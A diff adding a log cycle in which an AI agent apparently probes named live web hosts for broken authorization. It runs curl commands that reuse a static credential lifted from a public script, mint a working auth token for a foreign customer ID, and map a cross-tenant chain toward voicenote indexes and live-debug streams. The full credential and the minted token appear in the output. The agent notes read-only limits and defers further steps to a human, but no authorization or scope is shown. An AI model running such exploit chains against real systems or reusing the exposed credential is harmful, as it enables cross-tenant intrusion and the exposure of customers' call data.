@@ -12988,3 +12988,89 @@ testability: PASSIVE
 **STEP 7 — RISK**
 
 [RISK] questnet-gmbh: 74 — Chain stable and fully re-confirmed read-only: public help.js static credential (sha256 8d2faac1…) → arbitrary-cid live-debug token mint (success:true for foreign cid=2) → anonymous read of real-tenant voicenote index (customer_id ignored, byte-identical, re-confirmed NOT VPN-gated) → unauthenticated WS relay READY to backend CBS for any client-chosen cid/service. Four of five hops closed anonymously; only binary live_debug frame binding and raw-audio download gate remain untested (both AUTH_HELPED, not because controls were observed). One untested parallel hypothesis (get_agent_token.php) remains; if it mirrors auth.php the chain compounds further. Risk holds at 74 — no new control, no new surface, breadth exhausted. No recordings fetched, no live streams subscribed, no mutations, no PII echoed.
+===== ANALYST bigpickle 2026-09-07 19:51:51 UTC =====
+[0m
+> build · big-pickle
+[0m
+I'll execute the pending probe for the sole untested hypothesis (`get_agent_token.php`) before running the analysis steps.
+[0m$ [0mcurl -s -o /tmp/opencode/agt_demo.txt -w "demo:%{http_code}\n" "https://www.applicationdesigner.de/extjs/agent/get_agent_token.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3&customerId=131727"; sleep 1; curl -s -o /tmp/opencode/agt_foreign.txt -w "foreign:%{http_code}\n" "https://www.applicationdesigner.de/extjs/agent/get_agent_token.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3&customerId=2"
+demo:200
+foreign:200
+[0m
+[0m$ [0mecho "=== DEMO cid=131727 ==="; head -c 1200 /tmp/opencode/agt_demo.txt; echo; echo "=== FOREIGN cid=2 ==="; head -c 1200 /tmp/opencode/agt_foreign.txt; echo
+=== DEMO cid=131727 ===
+{"success":false,"message":"Zugriff verweigert."}
+=== FOREIGN cid=2 ===
+{"success":false,"message":"Zugriff verweigert."}
+[0m
+Both demo (131727) and foreign (cid=2) return `{"success":false,"message":"Zugriff verweigert."}` ("Access denied"). This is the static credential being rejected — contrasting `auth.php`. Let me run two control probes to rule out token-format/param artifacts.
+[0m$ [0mcurl -s -o /tmp/opencode/agt_sha.txt -w "sha256token:%{http_code}\n" "https://www.applicationdesigner.de/extjs/agent/get_agent_token.php?token=8d2faac1b96e020c077fb81aa3452b590d015d59bb826be700899187a0095cbf&customerId=2"; sleep 1; curl -s -o /tmp/opencode/agt_notok.txt -w "notoken:%{http_code}\n" "https://www.applicationdesigner.de/extjs/agent/get_agent_token.php?customerId=131727"
+sha256token:200
+notoken:200
+[0m
+[0m$ [0mecho "=== sha256 token cid=2 ==="; head -c 500 /tmp/opencode/agt_sha.txt; echo; echo "=== no token cid=131727 ==="; head -c 500 /tmp/opencode/agt_notok.txt; echo
+=== sha256 token cid=2 ===
+{"success":false,"message":"Not logged in","tech-info":"No VPN detected."}
+=== no token cid=131727 ===
+{"success":false,"message":"Not logged in","tech-info":"No VPN detected."}
+[0m
+Control probes are decisive. Now a single read-only reconfirm of `auth.php` (same host, same raw static credential) to lock the live status of the one anomalous mint, since I now have a live control on this host for token-recognition behavior.
+[0m$ [0mcurl -s -o /tmp/opencode/auth_recheck.txt -w "auth:%{http_code}\n" "https://www.applicationdesigner.de/extjs/livedebugger/auth.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3&customer_id=2&srn=100"
+auth:200
+[0m
+[0m$ [0mhead -c 600 /tmp/opencode/auth_recheck.txt; echo
+{"success":true,"data":{"auth":"517f7bc362a20b06d4ea177d399f31cfa9bef7fe0685d57b856976eef6e77564","ttl":1788810488},"total":1}
+[0m
+Probe cycle complete. `auth.php` per-cid mint for foreign cid=2 reconfirmed **LIVE** (`success:true`, 64-hex auth, ttl) with the raw public static credential — resolving the earlier "VPN gate" confusion definitively. `get_agent_token.php` is **REJECTED** as an anonymous mint.
+
+---
+
+**STEP 1 — DELTA**
+- [NEW] Probe 2026-09-07: `get_agent_token.php?token=<raw static>&customerId=131727` and `customerId=2` both → HTTP 200 `{"success":false,"message":"Zugriff verweigert."}` — token recognized but access-denied gate holds; NOT an anonymous per-cid mint.
+- [NEW] Control same probe: sha256-form token and omitted token both → `{"success":false,"message":"Not logged in","tech-info":"No VPN detected."}` — the "No VPN gate" signal is the generic invalid-token artifact, now delimited from valid-token-denied (`Zugriff verweigert.`).
+- [NEW] Control `auth.php?token=<raw static>&customer_id=2&srn=100` → `{"success":true,"data":{"auth":"517f7bc3…","ttl":…}}` — per-cid mint for foreign cid CONFIRMED STILL LIVE; anomaly isolated cleanly to auth.php.
+- [CHANGED] Sole untested chain hypothesis (`get_agent_token.php` parallel BOLA, 5 idle cycles) resolved → REJECTED; anonymous surface now exhausted.
+
+**STEP 2 — PRIORITIZE**
+- [PRIO] cbs-proxy.api.live-manager.de,9.0,a=9,b=10,t=7,g=10,c=8,f=5 (unchanged)
+- [PRIO] www.applicationdesigner.de,7.85,a=8,b=8,t=8,g=9,c=5,f=8 (unchanged)
+- [PRIO] www.live-manager.de,4.6,a=5,b=7,t=5,g=2,c=6,f=1 (unchanged)
+
+**STEP 3 — HYPOTHESES**
+[HYP] cbs-proxy data-plane binding for arbitrary cid (live-closure remainder)
+class: IDOR
+asset: wss://cbs-proxy.api.live-manager.de/?origin=LiveDebugger&cid={cid}&service={service}&token={minted}
+confidence: 92
+reasoning: Transport-complete: WS upgrade 101 + identical CONNECT CBS100/190/200 + READY frames for demo cid=131727 vs foreign cid=2, zero credentials; minted token accepted with no observable scoping; reconfirmed live last cycle (426 on non-WS HTTP only).
+evidence_needed: operator-confirmed (AUTH_HELPED) that a foreign-cid minted-token call-flow attaches real tenant data-plane frames vs demo-tenant control.
+verify_steps: AUTH_HELPED WS upgrade with token minted for foreign cid=2; compare live-debug frame payloads vs demo control.
+impact: cross-tenant live-debug stream attach; HIGH (CVSS 7.5); chain capstone.
+testability: AUTH_HELPED
+[HYP] voicenote raw-audio download gate for arbitrary cid
+class: IDOR
+asset: www.applicationdesigner.de/extjs/voicenotes/download.php?token={raw}&customer_id={cid}
+confidence: 60
+reasoning: check.php index re-confirmed cross-tenant byte-identical (success:true) for demo and foreign cid with raw static credential; download.php "No VPN detected." observed only on placeholder token — raw-token path needs operator session, not anonymous.
+evidence_needed: operator session to fetch a foreign-cid voicenote id from check.php output.
+verify_steps: AUTH_HELPED GET download.php for foreign cid + observed id; assert real audio bytes.
+impact: cross-tenant call-recording exfil; HIGH PII.
+testability: AUTH_HELPED
+
+**STEP 4 — SELF-CRITIQUE**
+- [REJECTED] get_agent_token.php parallel BOLA — dropped (probed this cycle, `Zugriff verweigert.`, no anonymous mint).
+- [PARKED] voicenotes/details.php extension: cross-tenant confirmed, ceiling = PII already documented, low incremental value.
+- [FINAL] 1. cbs-proxy data-plane frame binding (92, AUTH_HELPED) — sole live-closure item.
+- [FINAL] 2. auth.php per-cid mint + cbs-proxy transport chain (90) — reconfirmed live this cycle, report-complete on demonstrated primitives.
+- [FINAL] 3. Voicenote metadata PII (85) — re-confirmed cross-tenant, NOT VPN-gated.
+
+**STEP 5 — NEXT ACTION**
+- [NEXT] HUMAN: request scoped operator (AUTH_HELPED) session to confirm foreign-cid cbs-proxy data-plane frame binding vs demo-tenant control — the single closed-loop remainder; anonymous surface is exhausted (get_agent_token resolved as REJECTED this cycle).
+
+**STEP 6 — LEARNING**
+- [LEARN] REJECTED IDOR @ www.applicationdesigner.de/extjs/agent/get_agent_token.php: static credential does NOT mint — 200 `Zugriff verweigert.` for demo cid=131727 AND foreign cid=2 (raw token); sha256/no-token → generic invalid-token shape. Session-gated, NOT parallel to auth.php.
+- [LEARN] ACCEPTED IDOR @ www.applicationdesigner.de/extjs/livedebugger/auth.php: reconfirmed LIVE 2026-09-07 — raw static credential + foreign customer_id=2 → success:true 64-hex auth; "VPN gate" was artifact — invalid-token (`Not logged in`+`No VPN detected.`) now delimited from valid-token-denied (`Zugriff verweigert.`).
+- [LEARN] ACCEPTED IDOR @ www.applicationdesigner.de/extjs/voicenotes/check.php: cross-tenant byte-identical index re-confirmed, NOT VPN-gated (unchanged).
+- [LEARN] ACCEPTED IDOR @ cbs-proxy.api.live-manager.de: transport-complete BOLA, unchanged.
+
+**STEP 7 — RISK**
+- [RISK] questnet-gmbh: 74 — Chain re-confirmed read-only end-to-end: help.js static credential (sha256 8d2faac1…) → auth.php per-cid mint (foreign cid=2, still live) → cross-tenant voicenote index byte-identical → anonymous WS 101 relay to backend CBS for any cid. Sole untested parallel hypothesis resolved as REJECTED (get_agent_token.php session-gated), isolating the broken-auth anomaly to auth.php and sharpening the report. No recordings fetched, no live streams subscribed, no mutations, no PII echoed. Only data-plane frame binding and raw-audio download gate remain (both AUTH_HELPED, not because controls observed).
